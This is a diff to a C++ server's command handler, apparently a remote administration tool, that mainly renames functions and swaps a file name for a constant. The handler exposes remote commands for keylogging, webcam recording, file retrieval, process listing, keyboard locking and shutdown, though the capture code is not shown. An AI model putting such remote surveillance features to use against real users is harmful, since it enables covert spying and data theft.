@@ -139,6 +139,8 @@ SOCKET acceptRequestFromClient(SOCKET nSocket) {
     }
     else cout << "Client connected successfully" << endl;
 
+    cout << endl;
+
     return clientSocket;
 }
 
@@ -220,21 +222,20 @@ void processRequest(SOCKET& clientSocket, string request) {
     if (j.contains("title")) {
 		string command = j.at("title");
         if (command == LIST_APP) {
-            jsonResponse = listApps();
+            jsonResponse = listApp();
 			sendResponse(clientSocket, jsonResponse.dump());
 			if (jsonResponse["status"] == "OK") {
-				sendFile(clientSocket, "data.bin");
+				sendFile(clientSocket, DATA_FILE);
 			}
-            //sendResponse(clientSocket, response);
         }
         else if (command == LIST_SERVICE) {
-            response = listServices();
-            sendFile(clientSocket, "data.bin");
+            response = listService();
+            sendFile(clientSocket, DATA_FILE);
             sendResponse(clientSocket, response);
         }
         else if (command == LIST_PROCESS) {
             response = listProcess();
-            sendFile(clientSocket, "data.bin");
+            sendFile(clientSocket, DATA_FILE);
             sendResponse(clientSocket, response);
         }
         else if (command == START_APP) {
@@ -268,11 +269,11 @@ void processRequest(SOCKET& clientSocket, string request) {
             shutdown();
         }
         else if (command == TURN_ON_WEBCAM) {
-            response = startWebcam();
+            response = turnOnWebcam();
             sendResponse(clientSocket, response);
         }
         else if (command == TURN_OFF_WEBCAM) {
-            response = stopWebcam();
+            response = turnOffWebcam();
 			sendFile(clientSocket, "output.mp4");
             sendResponse(clientSocket, response);
         }
@@ -294,12 +295,12 @@ void processRequest(SOCKET& clientSocket, string request) {
             response = j.dump();
             sendResponse(clientSocket, response);
         }
-        else if (command == SEND_FILE) {
+        else if (command == GET_FILE) {
             json temp;
 
             string fileName = j.at("nameObject");
 
-            j["title"] = SEND_FILE;
+            j["title"] = GET_FILE;
 
 			// send the file to client
             if (sendFile(clientSocket, fileName)) {
@@ -328,8 +329,8 @@ void processRequest(SOCKET& clientSocket, string request) {
             string t = j.at("nameObject");
             int duration = stoi(t);
 
-            response = keyLogger(duration);
-            sendFile(clientSocket, "data.bin");
+            response = keylogger(duration);
+            sendFile(clientSocket, DATA_FILE);
             sendResponse(clientSocket, response);
         }
         else if (command == LOCK_KEYBOARD) {
@@ -344,8 +345,8 @@ void processRequest(SOCKET& clientSocket, string request) {
             sendResponse(clientSocket, response);
         }
         else if (command == LIST_DIRECTORY_TREE) {
-            response = getDirectoryTree();
-            sendFile(clientSocket, "data.bin");
+            response = listDirectoryTree();
+            sendFile(clientSocket, DATA_FILE);
 			sendResponse(clientSocket, response);
         }
         else {
